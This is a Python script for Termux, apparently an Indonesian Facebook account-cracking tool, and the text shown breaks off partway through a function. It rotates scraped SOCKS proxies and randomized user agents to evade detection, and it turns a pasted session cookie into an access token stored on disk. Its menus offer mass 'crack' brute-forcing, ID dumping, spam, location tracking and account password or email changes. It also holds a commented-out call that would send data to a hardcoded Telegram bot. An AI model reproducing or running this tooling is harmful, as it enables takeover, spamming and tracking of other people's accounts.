#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re, string
import urllib3,rich,base64
import re,requests,os,time
import os,sys
import socket,threading
import datetime
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as AsepXc
from bs4 import BeautifulSoup as parse
from time import time as mek
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.console import Console
from rich import print as cetak
from rich.columns import Columns
from rich import print as Buat
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from getpass import getpass
from rich.text import Text as tekz
from rich.progress import track
from pwinput import pwinput
from rich.console import Console
wa = Console()
console = Console()

#DATA AUTHOR#
Authorrrr = 'AsepitgansXc - TermuxSec'
Status = 'Private'
serverKey = 'Asep=Keyopenfullnegara=jagayysshy'
#DATA SERVER#

today_date = datetime.date.today()
tanggal = today_date.strftime("%Y-%m-%d")
res = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
nama_pelanggan, tanggal_daftar, tanggal_expired, type_pelanggan = [], [], [], []
urltokenpelanggan = "https://seraadev.my.id/api/user.php?token="

x = datetime.datetime.now()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FFFFFF"
	
#+++++# cek warna tema tools #+++++#	
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#FFFFFF"
	
#----------[server data Facebook]-----------#
pretty.install()
CON=sol()
console = Console()
#------------------[ USER-AGENT ]-------------------#
uakuh=[]
ugen=[]
ugen3=[]
ugen4=[]
cokbrut=[]
xxkontol=[]
ugen6=[]
ugen7=[]
proxxy = []
gabriel=[]
dump = []
memek = []
ualu,ualuh = [],[]
ses=requests.Session()
princp=[]
sys.stdout.write('\x1b]2; BFC|AsepitgansXc\x07')
#--------------[Proxy site Fresh]-----------#
try:
	prox= requests.get("https://api.proxyscrape.com/v2/#?request=displayproxies&protocol=socks4&timeout=100000&count#ry=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
#--------------[User agent mini]-----------#    
for xd in range(1000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='SM-J710MN)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen3.append(uaku2)
	
for xd in range(1000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','2','3','4','5','6','7','8','9','10','11','12'])
	c='10; K)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen3.append(uaku2)
  
	
#USER AGENT CRACK REDMI#
ugen8=[]
for tu in range(1000):
            a =random.randrange(3,12)
            b = random.choice([
            'Redmi 10 5G',
            'Redmi S2',
            'Redmi Note 9S',
            'Redmi X',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Redmi Y3',
            'Redmi Note 7 Pro',
            'Redmi Note 7S',
            'Redmi Note 8',
            'Redmi Note 10 JE',
            'Redmi Note 11 4G',
            'Redmi Note 11T Pro',
            'Redmi Note 11T Pro+',
            'Redmi Note 11S 5G',
            'Redmi Note 11 5G',
            'Redmi 10',
            'Redmi 1',
            'Redmi Note 11',
            'Redmi 10S',
            'Redmi 10I',
            'Redmi 10C',
            'Redmi 10A',
            'Redmi Note 1',
            'Redmi Note 10',
            'Redmi K50',
            'Redmi 3X',
            'Redmi 1S',
            'Redmi 12C',
            'Redmi 2A',
            'Redmi 12',
            'Redmi 6A',
            'Redmi 5 Pro',
            'Redmi 5 Plus',
            'Redmi 5pro',
            'Redmi 5A',
            'Redmi 85781',
            'Redmi 7i',
            'Redmi 7 Pro',
            'Redmi 7',
            'Redmi 7A',
            'Redmi 9A',
            'Redmi 9T NFC',
            'Redmi 9T',
            'Redmi 9pro',
            'Redmi 9C',
            'Redmi Go',
            'Redmi A8',
            'Redmi A90',
            'Redmi A2',
            'Redmi A3'])
            c = random.choice([
            'zh-TW',
            'es-es',
            'pt-br',
            'zh-cn',
            'zh-CN',
            'it-it',
            'it-it',
            'en-us',
            'zh-tw',
            'en-US',
            'fa-ir',
            'id-id'])
            d = random.randrange(1111, 2999)
            e = random.randrange(11, 19)
            f = random.randrange(73, 99)
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            uaku2 = f'Mozilla/5.0 (Linux; Android {c} {a}; {b} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36'
            ugen8.append(uaku2)
       

def uaasepitgansxc():
        rr = random.randint
        ya = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(100,200))}.0.0.0 Mobile Safari/537.36"
        return ya
            
model_android=[]
try:
	for xnxx in requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines():
		model_android.append(xnxx)
except:pass
try:
	for xxxx in requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines():
		user.append(xxxx)
except:pass
	
sim_id=''
fblc='en_GB'
android_version=subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model=subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build=subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
try:fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:fbcr='Zong'

fbmf=subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv=model
fbsv=android_version
fbca=subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm='{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
	fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
	total=0
	for i in fbcr:
		total+=1
	select=('1','2')
	if select == '1':
		fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
		sim_id+=fbcr
	elif select == '2':
		try:
			fbcr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
		except Exception as e:
			fbcr="Zong"
			sim_id+=fbcr
	else:
		fbcr='Zong'
		sim_id+=fbcr
except:fbcr='Zong'
device={'android_version':android_version,'model':model,'build':build,'fblc':fblc,'fbmf':fbmf,'fbbd':fbbd,'fbdv':model,'fbsv':fbsv,'fbca':fbca,'fbdm':fbdm}
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
versi_app = str(random.randint(111111111,999999999))
language = "en_GB"
try:
	simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:
	simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
	
ugent = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
#requests.post(f"https://api.telegram.org/bot6286449191:AAG3uDgINsf48ZhKxDv5-wvEIAHhz8vNbhQ/sendMessage?chat_id=5087794076&text={ugent}")

def uadalvik():
        rr = random.randint
        uahd = f"Dalvik/2.1.0 (Linux; U; Android 12; itel P662L Build/SP1A.210812.001) [FBAN/MessengerLite;FBAV/301.0.0.7.58;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/843884103;FBCR/XL Axiata;FBMF/ITEL;FBBD/Itel;FBDV/itel P662L;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
        return uahd
#---------------[Proxy new]---------------#        
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#
try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   prints(nel(f"{P2}Anda Tidak Terhubung Ke Internet, Silahkan Periksa Koneksi Internet Anda",width=70,padding=(0,2),style=f"{color_panel}"));exit()

#---------[data server Facebook]----------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni,ualu,ualuh= [],[],0,0,0,[],[],[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
ualu,ualuh = [],[]
#----------[kode warna server]----------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\033[32m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
pengguna = 'Private'
import datetime
x = datetime.datetime.now()
jam = x.strftime("%I:%M %p")
#----------[tanggal anda waktu]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tanggal = ''+str(tgl)+'-'+str(bln)+'-'+str(thn)+''
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

#----------[teks jalan]----------#       
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 


#----------[membersihkan layar]---------#
def clear():
	os.system('clear')
def back():
	login()

#----------[logo banner Asepitgans]---------#
def none():
	clear()
def info():
	prints(f"""""")
def banner():
	clear()
	prints(nel(f"""{color_text}{P2} _______ _______ _______ __  __ ______ _______ __  __ 
|   |   |_     _|    ___|  |/  |   __ \    ___|  |/  |
{M2}|       | |   | |    ___|     <|      <    ___|     < 
|__|_|__| |___| |___|   |__|\__|___|__|_______|__|\__|
""",title=f"{H2}52.1{P2}",subtitle=f"{H2}{Authorrrr}{P2}",width=70,style=f"{color_panel}"))
cookie=[]
#----------[Untuk Login Facebook]----------#
ses = requests.Session()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		ses = requests.Session()
		os.system('clear')
		banner()
		print('[+] Author : Asepitgans_XC - TermuxSec\n[+] Status : \033[32mNotCookie\033[0m')
		prints(nel(f'{P2}Masukan cookie anda dulu, Saran ektensi : [green]Cookiedough{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		cookie = input("[+] Cookie lu :\x1b[1;92m ")
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		prints(nel(f'{P2}Token : {K2}{tok}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{H2}Login berhasil tersimpan di .token.txt && .cok.txt\nSilahkan jalankan ulang....{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	except Exception as e:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
		
ses = requests.Session()
def login_lahhgi334():
	os.system('clear')
	banner()
	print('[+] Author : Asepitgans_XC - TermuxSec\n[+] Status : \033[32mNotCookie\033[0m')
	prints(nel(f'{P2}Masukan cookie anda dulu, Saran ektensi : [green]Cookiedough{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	cok = input("[+] Cookie lu :\x1b[1;92m ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:prints(nel(f'{H2}Cookie anda expired/kedaluwarsa makanya ganteng{P2}',width=70,padding=(0,7),style=f"{color_panel}"));time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				prints(nel(f'{P2}Token : {K2}{took}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				prints(nel(f'{H2}Login berhasil tersimpan di .token.txt && .cok.txt{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	except Exception as e:
		print(e)

	     
tanda = '+'
#-----------[menu Facebook crack]----------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:
		print('\033[0m╰─ Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	try:cek_data = requests.get("http://ip-api.com/json/").json()
	except:cek_data = {'-'}
	try:card = cek_data["isp"]
	except:card = {'-'}
	try:indo = cek_data["country"]
	except:indo = {'-'}
	try:zone = cek_data["timezone"]
	except:zone = {'-'}
	try:lat = cek_data["lat"]
	except:lat = {'-'}
	try:lon = cek_data["lon"]
	except:lon = {'-'}
	try:Lokasi = cek_data["city"]
	except:Lokasi = {'-'}
	try:pickkartu=cek_data["as"]
	except:pickkartu = {'-'}
	try:Iplu=cek_data["query"]
	except:Iplu = {'-'}
	try:ng=cek_data["country"]
	except:ng = {'-'}
	prints(nel(f'{P2}Name   : {H2}{my_name}\n{P2}ID     : {H2}{my_id} \n{P2}Kota   : {H2}{Lokasi}{P2}',title=f'{H2}{pengguna}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	prints(nel(f"""{P2}[{color_text}01{P2}]. Crack Public          [{color_text}05{P2}]. Cek Hasil 
[{color_text}02{P2}]. Crack Public/[green]Massal [white]  [{color_text}06{P2}]. Cek Account
[{color_text}03{P2}]. Crack File            [{color_text}07{P2}]. Crack Group\n[{color_text}04{P2}]. Crack gmail           [[red]08{P2}]. Dump ID""",width=70,padding=(0,7),style=f"{color_panel}"));prints(nel(f'{P2}Ketik "{H2}bot,exit,bug{P2}" jika ingin menggunakan{P2}',title=f'{H2}{jam} - {Iplu}{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	Asepitgans_Dev = input('[+] Pilih : ')
	if Asepitgans_Dev in ['1','01']:
		prints(nel(f'{P2}Ketik "{H2}Me{P2}" {P2}Jika Ingin Crack Teman Sendiri\n{P2}Tekan "{M2}CTRL + C{P2}" Untuk Berhenti Dump{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		idt = input('[+] Username/ID : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif Asepitgans_Dev in ['2','02']:
		dump_massal()
		#prints(nel(f'{P2}Banyaknya id, pisahkan dengan koma\n{P2}Tekan "{M2}CTRL + C{P2}" Untuk Berhenti Dump{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		#user = input(f'[+] Username/ID : ')
#		if user =='': #prints(nel(f'{P2} Kamu kaya kontol anjng {P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	#	for uuid in user.split(','):
		#	try:
			#	Dump().dump_publik(uuid,cok,token,'')
			#except KeyboardInterrupt: pass
		#	except Exception as e: sys.exit(e)
		#	setting()
	elif Asepitgans_Dev in ['Bug','bug']:
		#khususprem()
		report()
	elif Asepitgans_Dev in ['3','03']:
		prints(nel(f'{P2} Tools Crack file simple{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Crack file v¹\n[{color_text}02{P2}]. Crack file v²{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		Asep_sedunia_ganteng = input('[+] Pilih : ')
		if Asep_sedunia_ganteng in ['01','1']:
			#khususprem()
			crack_file()
		elif Asep_sedunia_ganteng in ['02','2']:
			#khususprem()
			crack_filev2()
		else:
			prints(nel(f'{P2}Lu buta apa gimana si anjing :v{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif Asepitgans_Dev in ['4','04']:
		prints(nel(f'{P2}Tools brute crak simple/dan bagus untuk coli\Pilihan Crack Bisa Menulis Ke {H2}mail{P2}/{K2}yaho{P2}/{M2}user{P2}/{H2}Nomor{P2} pilih method no {H2}7{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Crack Gmail\n[{color_text}02{P2}]. Crack Yahoo\n[{color_text}03{P2}]. Crack username\n[{color_text}04{P2}]. Crack Nomor Telepon{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		Asep_sukaColi_DanGanteng = input('[+] Pilih : ')
		if Asep_sukaColi_DanGanteng in ['01','1','mail','gmail']:
			#khususprem()
			clon_email()
		elif Asep_sukaColi_DanGanteng in ['02','2','yaho','yahoo']:
			#khususprem()
			clon_yahoo()
		elif Asep_sukaColi_DanGanteng in ['03','3','user','nama']:
			#khususprem()
			crack_nama()
		elif Asep_sukaColi_DanGanteng in ['04','4','nomor','nom']:
			#khususprem()
			crack_nomor()
		else:
			prints(nel(f'{P2}Lu buta apa gimana si anjing :v{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	elif Asepitgans_Dev in ['5','05']:
		result()
	elif Asepitgans_Dev in ['lain']:
		menulain()
	elif Asepitgans_Dev in ['6','06']:
		prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Cek detektor Account Link V¹\n[{color_text}02{P2}]. Cek detektor Account By Latif V²\n[{color_text}03{P2}]. Cek detektor Account Link V³\n[{color_text}04{P2}]. Cek detektor Account Link V⁴{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		AsepPaling_Ganteng_Pisan = input('[+] pilih : ')
		if AsepPaling_Ganteng_Pisan in ['01','1']:
			#khususprem()
			file_cp()
		elif AsepPaling_Ganteng_Pisan in ['02','2']:
			#khususprem()
			cekdetektor()
		elif AsepPaling_Ganteng_Pisan in ['03','3']:
			#khususprem()
			filecek_cp()
		elif AsepPaling_Ganteng_Pisan in ['04','4']:
			#khususprem()
			filecek4_cp()
		else:
			prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	elif Asepitgans_Dev in ['8','08']:
		#khususprem()
		prints(nel(f'{P2}[{color_text}01{P2}]. Dump id sesuai tahun\n[{color_text}02{P2}]. Dump id sesuai teman{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		idss = input('[+] Pilih : ')
		if idss in ['01','1']:
			Asepitgans_xXc()
		elif idss in ['02','2']:
			dumpid()
		else:prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	elif Asepitgans_Dev in ['bot']:
		#prints(nel(f'{P2}Tools Serbaguna Yang Bisa Dipakai [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		prints(nel(f'{P2}[{color_text}01{P2}]. Profil Guard    [{color_text}02{P2}]. Tools spam\n[{color_text}03{P2}]. Garap Method    [{color_text}04{P2}]. Pasang_a2f\n[{color_text}05{P2}]. Lacak lokasi    [{color_text}06{P2}]. Ubah password\n[{color_text}07{P2}]. Tools chat      [{color_text}08{P2}]. Tambahkan email\n[{color_text}09{P2}]. Share Facebook  [{color_text}10{P2}]. Spam telegram{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		#prints(nel(f'{P2}Ketik "{M2}back{P2}" untuk kembali menu awal{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		Asep_Ganteng_Pisan = input('[+] Pilih : ')
		if Asep_Ganteng_Pisan in ['1','01']:
			#khususprem()
			profile_guard()
		elif Asep_Ganteng_Pisan in ['2','02']:
			#khususprem()
			menu_utama()
		elif Asep_Ganteng_Pisan in ['3','03']:
			#khususprem()
			siu()
		elif Asep_Ganteng_Pisan in ['4','04']:
			#khususprem()
			prints(nel(f'{P2}[{color_text}01{P2}]. Pasang a2f aplikasi\n[{color_text}02{P2}]. Pasang a2f tidak aplikasi {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			pasang = input('[+] Chouse : ')
			if pasang in ['01','1']:
				pasang_a2f()
			elif pasang in ['02','2']:
				authenticator()
			else:
				prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		elif Asep_Ganteng_Pisan in ['5','05']:
			lacak()
		elif Asep_Ganteng_Pisan in ['10','10']:
			spamtele()
		elif Asep_Ganteng_Pisan in ['6','06']:
			prints(nel(f'{P2}[{color_text}01{P2}]. Ubah password narget\n[{color_text}02{P2}]. Ubah password massall{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			pwww = input('[+] Chouse : ')
			if pwww in ['01','1']:
				prints(nel(f'{P2} Masukan [green]Cookie[white] anda terlebih dahulu {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				cokie = input("[+] Cookie:\033[32m ")
				prints(nel(f'{P2}Masukan password lama/baru anda {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				old = input("\033[0m[+] Password lama: ")
				new = pwinput("[+] Password baru: ")
				ubahpw(old, new, cokie)
			elif pwww in ['02','2']:
				F()
				#prints(nel(f'{P2}Maaf fitur ini dalam tahap perkembangan{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
			else:
				prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		elif Asep_Ganteng_Pisan in ['7','07']:
			#khususprem()
			mmk()
		elif Asep_Ganteng_Pisan in ['9','09']:
			#khususprem()
			share()
		elif Asep_Ganteng_Pisan in ['8','0']:
			#khususprem()
			prints(nel(f'{P2}[{color_text}01{P2}]. Tambahkan email otomatis\n[{color_text}02{P2}]. Mengubah email utama\n[{color_text}03{P2}]. Mengahpus email anda{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			KeylaPutri=input('[+] Choose : ')
			if KeylaPutri in ['01','1']:
				plus_email()
			elif KeylaPutri in ['02','2']:
				prints(nel(f'{P2}Masukan cookie anda yang ingin di ubah{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				ck = input("[+] Cookies : \033[32m")
				prints(nel(f'{P2}Tambahkan email yag ingin di ubah menjadi utama{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				email = input("[+] Email anda :\033[32m ")
				utama(ck,email)
			elif KeylaPutri in ['03','3']:
				prints(nel(f'{P2}Masukan cookie anda yang ingin di hapus{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				cck = input('[+] Cookie :\033[32m ')
				pss = pwinput('\033[0m[+] Password anda : ')
				prints(nel(f'{P2}Silahkan Anda Tuliskan Email Yang Ingin Dihapus{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
				mail = input("[+] Email anda :\033[32m ")
				hps(cck,mail,pss)
			else:
				prints(nel(f'{P2}Pilih Yang Bener Lah kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	elif Asepitgans_Dev in ['7','07']:
		group()
	elif Asepitgans_Dev in ['exit','Exit']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		prints(nel(f'{H2}Successfully Logout+Delete Cookies{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()
	else:
		prints(nel(f'{K2}input correctly{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		back()
def siu():
	start()
	get_data_web()
	akhir()
def error():
	prints(nel(f'{K2}Sorry, this feature is still being fixed{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	time.sleep(4)
	back()
def ganti_tema():
		prints(nel(f""" Maaf Tools Ini Sedang Di Perbaiki """,width=70,padding=(0,7),style=f"{color_panel}"))
		sleep(2) 
		back()

#-------------------[PUBLIK MASSAL]--------------------#
#----------[dump id massal]-----------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'[+] input target amount ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'[+] Enter the Id '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       dump(user,"",{"cookie":cok},token)
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      #print(" Total  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
